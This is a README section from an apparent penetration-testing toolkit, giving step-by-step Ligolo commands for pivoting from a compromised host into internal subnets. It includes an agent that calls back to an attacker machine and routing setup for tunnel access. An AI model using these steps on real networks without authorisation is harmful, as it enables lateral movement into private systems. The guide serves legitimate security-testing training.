## 04 - Pivot
Some internal networks have multiple subnets that may not be directly accessible via our attacker machine. Create listeners on target machines, set up port forwarding accordingly and tunnel through. Each new target will require another listener to be hosted, fyi.
<br>
### CONTENT
| Script Name | Description |
| --- | --- |
| `ligolo-agent-linux` | Ligolo - agent to be transferred unto LINUX target (default port: 11601) |
| `ligolo-agent-windows.exe` | Ligolo - agent to be transferred unto WINDOWS target (default port: 11601) |
---

## Instructions
The following guide assumes the following network subnet infrastructure:
![image](https://github.com/user-attachments/assets/ce399c79-2d1f-4855-bb42-0dd6269482b3)


**ATTACKER**: Set up the proxy by creating a separate network interface (customize user accordingly).
```
sudo ip tuntap add user scorpio mode tun ligolo; sudo ip link set ligolo up
```

**ATTACKER**: Start up the proxy with a default self-cert option (real production environments will use certs).
```
ligolo-proxy -selfcert
```
---
#### In case certificates are used...
**ATTACKER**: Add issued certificates as needed
```
ligolo-proxy -certfile <CERT.CRT> -keyfile <CERT.KEY>
```
**PIVOT**: Run the agent with the certificate
```
.\ligolo-agent-windows -connect <ATTACKER>:11601
```
---
**PIVOT**: Start the agent.
```
.\ligolo-agent-windows -connect <ATTACKER>:11601 -ignore-cert
```

![image](https://github.com/user-attachments/assets/ebe4958e-893e-49a4-b1a0-cb4fa6cbd88b)

**ATTACKER**: And set up the tunnel.
```
session
1
ifconfig           # Verify the network interfaces of the connected agent
```

**ATTACKER**: Add the tunnel entry to the routing table to access INTERNAL.
```
sudo ip route add <INTERNAL-NETWORK> dev ligolo
start
```
ATTACKER: OR create the local route to PIVOT machine (To access ports on PIVOT, use 240.0.0.1/32 instead)
```
# Check diagram at the tope for reference
sudo ip route add 240.0.0.1/32 dev ligolo
```
---
At this current stage, we've attached an **agent on the PIVOT machine** that sends web traffic to the **listener on ATTACKER machine**, which allows us access to the PIVOT network of 192.168.1.0/24.
We can easily transfer files back and forth between the public internet and DMZ environment. For reference to the previous commands:
- ATTACKER: 127.0.0.1
- PIVOT: 240.0.0.1

![image](https://github.com/user-attachments/assets/88e112b4-0cfe-4776-ae8f-bf2c356b79b0)

<br>
Assume, after further enumeration of the PIVOT server, we find another interface that hosts the INTERNAL network. In order to access
the ports on an INTERNAL machine, we need to set up a new listener tunnel. This time, we'll set up the listener on PIVOT!

